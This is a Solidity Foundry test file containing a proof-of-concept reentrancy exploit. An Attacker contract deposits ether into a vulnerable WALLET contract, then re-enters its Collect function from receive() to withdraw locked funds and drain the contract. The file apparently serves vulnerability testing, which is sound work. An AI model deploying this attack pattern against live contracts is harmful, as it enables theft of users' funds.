
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {WALLET, Log} from "../src/WALLET.sol";

contract TestReentrancyWALLET is Test {
    
    WALLET public _contractUnderTest;
    Log public _log;
    Attacker public _attacker;

    function setUp() public {
        _log = new Log();
        _contractUnderTest = new WALLET(address(_log));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        // --- 1. Constraints & Pitfall Avoidance ---
        // We want to prove we can withdraw funds that would otherwise be locked by the MinSum check (1 ether).
        // Scenario: Deposit 2 * attackVal. Withdraw attackVal. Remaining is attackVal.
        // If attackVal < 1 ether, the remaining funds are locked in a normal scenario.
        // With reentrancy, we can withdraw the second chunk before the balance updates.
        // Constraints: 
        // 1. Total Deposit (2 * attackVal) >= MinSum (1 ether). -> attackVal >= 0.5 ether.
        // 2. Remaining (attackVal) < MinSum (1 ether). -> attackVal < 1 ether.
        vm.assume(attackVal >= 0.5 ether && attackVal < 1 ether);

        // --- 2. State Configuration (Pre-Condition) ---
        // No specific state needed on WALLET other than deposit, handled in attack setup.

        // --- 3. Funding ---
        uint256 depositAmount = attackVal * 2;
        
        // Fund the Attacker
        vm.deal(address(_attacker), depositAmount);

        // Fund the Test Contract (address(this)) to facilitate transfers if needed
        vm.deal(address(this), depositAmount);

        // --- 4. Trigger Attack ---
        _attacker.setupAttack{value: depositAmount}(depositAmount);
        
        // WALLET.Collect requires block.timestamp > acc.unlockTime.
        // setupAttack calls Put(0), setting unlockTime to block.timestamp.
        // We must warp forward to satisfy the condition.
        vm.warp(block.timestamp + 10);

        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
        
        // Additional verification: The attacker should have drained the full depositAmount.
        assertEq(address(_contractUnderTest).balance, 0, "Victim contract should be empty");
    }

    receive() external payable {}
}

contract Attacker {
    WALLET public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        _victim = WALLET(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        
        // Deposit funds to the victim. 
        // We pass 0 as unlockTime so it defaults to block.timestamp.
        _victim.Put{value: val}(0);
    }

    function attack(uint256 val) public {
        storedAttackVal = val;

        // Call the vulnerable function.
        _victim.Collect(val);

        // Verify Success Conditions.
        // If we managed to call Collect twice and drain the funds, the victim balance for us should be 0 
        // (or the contract balance 0) and we should have our funds back.
        // Specifically, we check if we successfully re-entered.
        if (attackCallCount > 0) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        // Re-enter once.
        if (attackCallCount < 1) {            
            attackCallCount++;
            _victim.Collect(storedAttackVal);
        }
    }
}
